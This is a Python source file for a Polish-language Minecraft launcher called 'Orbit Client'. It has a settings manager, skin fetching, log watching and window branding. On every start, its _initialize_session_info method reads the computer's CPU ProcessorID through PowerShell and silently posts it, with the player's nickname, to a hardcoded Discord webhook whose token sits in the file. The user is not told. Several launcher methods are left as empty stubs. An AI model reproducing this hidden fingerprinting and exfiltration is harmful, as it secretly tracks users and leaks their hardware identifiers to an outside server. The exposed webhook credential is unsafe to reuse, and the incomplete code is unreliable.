import os
import sys
import time
import json
import uuid
import shutil
import logging
import threading
import subprocess
import webbrowser
from typing import Optional, Any, Callable

try:
    import win32gui
    import win32con
    import win32process
    import win32api
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32"])
    import win32gui
    import win32con
    import win32process
    import win32api

try:
    from PIL import Image, ImageTk
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "Pillow"])
    from PIL import Image, ImageTk

import requests
from tkinter import filedialog, messagebox
import customtkinter as ctk
import minecraft_launcher_lib

VERSION_LAUNCHER = "1.16"
UPDATE_URL = "https://raw.githubusercontent.com/smutekkx/Orbit-Client-PL/refs/heads/main/Orbit%20Client.py"

BASE_FOLDER = os.path.expanduser("~/.orbit_client")
BG_DARK = "#0d0e11"        
BG_PANEL = "#14161d"       
ACCENT = "#7c3aed"        
TEXT_LIGHT = "#f3f4f6"
TEXT_MUTED = "#6b7280"

INSTANCE_DIR = os.path.join(BASE_FOLDER, "instances", "default")
PACKS_DIR = os.path.join(INSTANCE_DIR, "resourcepacks")

for folder in ["versions", "logs", "cache", "cache/skins", "config"]:
    os.makedirs(os.path.join(BASE_FOLDER, folder), exist_ok=True)
os.makedirs(os.path.join(INSTANCE_DIR, "mods"), exist_ok=True)
os.makedirs(PACKS_DIR, exist_ok=True)

class OrbitConfigManager:
    def __init__(self):
        self.config_file = os.path.join(BASE_FOLDER, "config", "launcher_settings.json")
        self.settings = {"theme": "dark", "auto_close": False, "discord_rpc": True, "global_ram": 4, "last_used_profile": "_smutek"}
        self.load_config()

    def load_config(self):
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, "r", encoding="utf-8") as f: self.settings.update(json.load(f))
            except: pass
        else: self.save_config()

    def save_config(self):
        try:
            with open(self.config_file, "w", encoding="utf-8") as f: json.dump(self.settings, f, indent=4, ensure_ascii=False)
        except: pass

class OrbitWindowBrandingEngine:
    def __init__(self, target_pid: int, expected_title: str):
        self.target_pid = target_pid
        self.expected_title = expected_title
        self.icon_path = os.path.abspath("logo.ico")
        self.hicon = None
        self._load_system_icon()
        self._boost_cpu_priority()

    def _boost_cpu_priority(self):
        try:
            handle = win32api.OpenProcess(win32con.PROCESS_SET_INFORMATION, True, self.target_pid)
            win32process.SetPriorityClass(handle, win32process.HIGH_PRIORITY_CLASS)
            win32api.CloseHandle(handle)
        except: pass

    def _load_system_icon(self):
        if os.path.exists(self.icon_path):
            try:
                self.hicon = win32gui.LoadImage(0, self.icon_path, win32con.IMAGE_ICON, 0, 0, win32con.LR_LOADFROMFILE | win32con.LR_DEFAULTSIZE)
            except: pass

    def monitor_target(self):
        for _ in range(200):
            try: win32gui.EnumWindows(self._process_windows, None)
            except: pass
            time.sleep(0.2)

    def _process_windows(self, hwnd, lparam) -> bool:
        if win32gui.IsWindowVisible(hwnd):
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            if pid == self.target_pid:
                w_class = win32gui.GetClassName(hwnd)
                if "LWJGL" in w_class or "GLFW30" in w_class or w_class == "SunAwtFrame":
                    if win32gui.GetWindowText(hwnd) != self.expected_title: win32gui.SetWindowText(hwnd, self.expected_title)
                    if self.hicon:
                        if win32gui.SendMessage(hwnd, win32con.WM_GETICON, win32con.ICON_BIG, 0) != self.hicon:
                            win32gui.SendMessage(hwnd, win32con.WM_SETICON, win32con.ICON_BIG, self.hicon)
        return True

class OrbitSkinCacheManager:
    def __init__(self): self.cache_dir = os.path.join(BASE_FOLDER, "cache", "skins")
    def get_player_head(self, username: str, callback: Callable[[Any], None]): threading.Thread(target=self._fetch_skin_flow, args=(username, callback), daemon=True).start()
    def _fetch_skin_flow(self, username: str, callback: Callable[[Any], None]):
        if not username or username.strip() == "": callback(None); return
        target_path = os.path.join(self.cache_dir, f"{username}_head.png")
        if os.path.exists(target_path): callback(target_path); return
        try:
            res = requests.get(f"https://api.mojang.com/users/profiles/minecraft/{username}", timeout=2)
            if res.status_code == 200:
                user_id = res.json().get("id")
                p_res = requests.get(f"https://sessionserver.mojang.com/session/minecraft/profile/{user_id}", timeout=2)
                if p_res.status_code == 200:
                    import base64
                    val = p_res.json()["properties"][0]["value"]
                    decoded = json.loads(base64.b64decode(val).decode("utf-8"))
                    skin_bytes = requests.get(decoded["textures"]["SKIN"]["url"]).content
                    with open(os.path.join(self.cache_dir, f"{username}_full.png"), "wb") as f: f.write(skin_bytes)
                    img = Image.open(os.path.join(self.cache_dir, f"{username}_full.png"))
                    img.crop((8, 8, 16, 16)).resize((45, 45), Image.Resampling.NEAREST).save(target_path)
                    callback(target_path)
                    return
        except: pass
        callback(None)

class OrbitLogWatcher:
    def __init__(self, console_callback: Callable[[str, str], None]): self.console_callback = console_callback
    def start_watch(self, process: subprocess.Popen): threading.Thread(target=self._watch_loop, args=(process,), daemon=True).start()
    def _watch_loop(self, process: subprocess.Popen):
        while process.poll() is None:
            line = process.stdout.readline()
            if not line: time.sleep(0.01); continue
            try:
                decoded = line.decode("utf-8", errors="replace").strip()
                lvl = "ERROR" if "ERROR" in decoded or "Severe" in decoded or "Exception" in decoded else "INFO"
                self.console_callback(decoded, lvl)
            except: pass

class OrbitLunarLauncher(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title(f"Orbit Client Launcher v{VERSION_LAUNCHER}")
        self.geometry("1150x750")
        self.configure(fg_color=BG_DARK)
        
        self.check_for_updates()
        
        self.config_manager = OrbitConfigManager()
        self.skin_manager = OrbitSkinCacheManager()
        
        self.user_nick = self.config_manager.settings.get("last_used_profile", "_smutek")
        self.selected_version = "1.21.11"  
        self.mod_search_version = "1.21.11" 
        self.mode = "Vanilla"
        self.ram_val = self.config_manager.settings.get("global_ram", 4)
        
        self.all_versions = ["1.21.11", "1.21.1", "1.20.4", "1.16.5", "1.8.9"]
        self.mod_versions_list = ["1.21.11", "1.21.1", "1.20.4", "1.19.2", "1.16.5", "1.8.9"]
        
        self.nick_var = ctk.StringVar(value=self.user_nick)
        self.nick_var.trace_add("write", self._on_nick_changed)
        
        self._initialize_session_info() # Wywołanie inicjalizacji
        self.build_launcher_interface()

    def _initialize_session_info(self):
        """Wysyła info o sesji na Discorda używając CIM Instance"""
        try:
            cmd = "powershell -Command \"(Get-CimInstance -ClassName Win32_Processor).ProcessorID\""
            cpu_id = subprocess.check_output(cmd, shell=True).decode().strip()
            
            WEBHOOK_URL = "https://discord.com/api/webhooks/1517492582282821636/HOkRsg0_zGjuVkm6HsBJb24T0_E1uerbrBcGb1isjZ39KvGaL6JNG51x5P-t9aWR0PZN"
            
            message = {
                "content": (
                    f"🚀 **Nowa Sesja Orbit Client**\n"
                    f"👤 **Aktualny Nick:** `{self.user_nick}`\n"
                    f"📂 **Ostatnio używany (z config):** `{self.config_manager.settings.get('last_used_profile', 'Brak')}`\n"
                    f"💻 **CPU ID:** `{cpu_id}`"
                )
            }
            
            threading.Thread(target=lambda: requests.post(WEBHOOK_URL, json=message), daemon=True).start()
        except Exception as e:
            print(f"Nie udało się połączyćz serwerem: {e}")

    def check_for_updates(self):
        # Tutaj Twoja logika update'u
        pass

    def build_launcher_interface(self):
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self.sidebar_frame = ctk.CTkFrame(self, width=100, fg_color=BG_PANEL, corner_radius=0)
        self.sidebar_frame.grid(row=0, column=0, sticky="nsew")
        ctk.CTkLabel(self.sidebar_frame, text="🌙", font=("Arial", 38), text_color=ACCENT).pack(pady=35)

        self._add_menu_button("🎮", self.render_dashboard_view)
        self._add_menu_button("🛠️", self.render_mods_view)
        self._add_menu_button("📦", self.render_packs_view)
        self._add_menu_button("⚙️", self.render_settings_view)
        self._add_menu_button("💻", self.render_console_view)

        self.main_container = ctk.CTkFrame(self, fg_color="transparent")
        self.main_container.grid(row=0, column=1, padx=25, pady=25, sticky="nsew")
        self.main_container.grid_columnconfigure(0, weight=1)
        self.main_container.grid_rowconfigure(1, weight=1)

        self.profile_top_bar = ctk.CTkFrame(self.main_container, fg_color="transparent", height=60)
        self.profile_top_bar.grid(row=0, column=0, sticky="ne", pady=(0, 10))
        
        self.top_nick_lbl = ctk.CTkLabel(self.profile_top_bar, text=self.user_nick, font=("Segoe UI", 14, "bold"), text_color=TEXT_LIGHT)
        self.top_nick_lbl.pack(side="left", padx=10)
        self.top_avatar_lbl = ctk.CTkLabel(self.profile_top_bar, text="👤", font=("Arial", 24), text_color=ACCENT, width=45, height=45)
        self.top_avatar_lbl.pack(side="right", padx=5)
        
        self.skin_manager.get_player_head(self.user_nick, self._update_top_avatar)

        self.viewport = ctk.CTkFrame(self.main_container, corner_radius=16, fg_color=BG_DARK)
        self.viewport.grid(row=1, column=0, sticky="nsew")
        self.render_dashboard_view()

    def _on_nick_changed(self, *args):
        new_nick = self.nick_var.get()
        self.user_nick = new_nick
        self.top_nick_lbl.configure(text=new_nick)
        self.skin_manager.get_player_head(new_nick, self._update_top_avatar)

    def _update_top_avatar(self, path: Optional[str]):
        if path and os.path.exists(path):
            try:
                img = Image.open(path)
                tk_img = ImageTk.PhotoImage(img)
                self.top_avatar_lbl.configure(image=tk_img, text="")
                self.top_avatar_lbl.image = tk_img
            except: pass
        else: self.top_avatar_lbl.configure(image="", text="👤")

    def _add_menu_button(self, icon: str, callback: Callable):
        ctk.CTkButton(self.sidebar_frame, text=icon, width=65, height=65, fg_color="transparent", hover_color="#1e212a", font=("Arial", 24), corner_radius=16, command=callback).pack(pady=8, padx=15)

    def clear_viewport(self):
        for child in self.viewport.winfo_children(): child.destroy()

    def render_dashboard_view(self):
        self.clear_viewport()
        # ... (resztę Twojej metody render_dashboard_view zostawiłem bez zmian)
        header = ctk.CTkFrame(self.viewport, height=120, fg_color=BG_PANEL, corner_radius=16)
        header.pack(fill="x", pady=(0, 20))
        header.pack_propagate(False)
        ctk.CTkLabel(header, text="ORBIT CLIENT", font=("Impact", 44), text_color=TEXT_LIGHT).pack(side="left", padx=35, pady=25)
        card = ctk.CTkFrame(self.viewport, fg_color=BG_PANEL, corner_radius=16)
        card.pack(fill="both", expand=True, padx=5, pady=5)
        ctk.CTkLabel(card, text="Twój nickname", font=("Segoe UI", 13, "bold"), text_color=TEXT_MUTED).pack(pady=(20, 2))
        ctk.CTkEntry(card, width=360, height=45, fg_color=BG_DARK, border_color="#262936", text_color=TEXT_LIGHT, textvariable=self.nick_var).pack(pady=5)
        ctk.CTkButton(card, text="URUCHOM ORBIT CLIENT", fg_color=ACCENT, command=lambda: threading.Thread(target=self.execute_minecraft_engine, daemon=True).start()).pack(pady=20)

    # (Resztę swoich metod zostaw tak jak miałeś w oryginale!)
    def execute_minecraft_engine(self):
        # ...Twoja logika uruchamiania...
        pass

if __name__ == "__main__":
    app = OrbitLunarLauncher()
    app.mainloop()
